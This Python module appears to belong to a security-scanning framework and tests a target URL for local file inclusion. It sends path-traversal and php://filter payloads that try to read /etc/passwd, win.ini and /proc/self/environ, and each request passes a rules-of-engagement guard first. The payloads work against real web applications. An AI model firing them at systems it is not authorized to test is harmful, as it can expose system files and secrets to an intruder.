from __future__ import annotations

from ..config import load_engine
from ..contract import Capability, ScanResult
from ..roe_guard import ROEGuard, ROEViolation
from .. import http as _http
from ..util import any_handler_reached, unreached_reason


CAPABILITY = Capability(
    name="lfi_scan",
    description="Local/Remote File Inclusion via path traversal.",
    category="injection",
    cost="medium",
    destructive=False,
    idempotent=True,
)

TRAVERSALS = [
    ("etc_passwd", "../../../../etc/passwd", "root:"),
    ("etc_passwd_depth5", "../../../../../etc/passwd", "root:"),
    ("win_ini", "..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("proc_environ", "../../../../proc/self/environ", "PATH="),
]

PHP_WRAPPERS = [
    ("php_filter_passwd",
     "php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
]

PARAMS = ["file", "path", "page", "include", "view", "template", "doc",
          "document", "load", "read", "src", "source", "filename", "name"]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _send(url, param, payload, method, headers, timeout, verify, roe_guard):
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"blocked": True, "error": f"ROE_BLOCK: {viol}"}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                r = c.post(url, data={param: payload}, headers=headers or {})
            else:
                r = c.get(url, params={param: payload}, headers=headers or {})
        return {"status": r.status_code, "body": (r.text or "")[:4000]}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def scan(target_url, param=None, method="GET", headers=None, roe_guard=None,
         timeout=10):
    verify = _verify_tls()
    params = [param] if param else PARAMS[:8]
    attempts = []
    findings = []
    all_payloads = TRAVERSALS + PHP_WRAPPERS
    for pname in params:
        for label, payload, marker in all_payloads:
            r = _send(target_url, pname, payload, method, headers, timeout,
                      verify, roe_guard)
            if r.get("blocked"):
                return ScanResult(
                    capability="lfi_scan", target=target_url,
                    verdict="UNKNOWN", reason=r["error"],
                )
            attempts.append({"param": pname, "payload": label,
                             "status": r.get("status")})
            body = r.get("body") or ""
            if marker and marker in body:
                findings.append({
                    "param": pname, "payload": label, "marker": marker,
                    "preview": body[:300],
                })
                break
        if findings:
            break
    if findings:
        return ScanResult(
            capability="lfi_scan", target=target_url,
            verdict="VULNERABLE", severity="high",
            reason=f"LFI on param '{findings[0]['param']}' ({findings[0]['payload']})",
            evidence={"findings": findings, "attempts": attempts[:30]},
        )
    if not any_handler_reached(attempts):
        return ScanResult(
            capability="lfi_scan", target=target_url,
            verdict="UNKNOWN", reason=unreached_reason(attempts),
            evidence={"attempts": attempts[:30]},
        )
    return ScanResult(
        capability="lfi_scan", target=target_url,
        verdict="PASS", severity="low",
        reason=f"no LFI markers across {len(attempts)} attempts",
    )
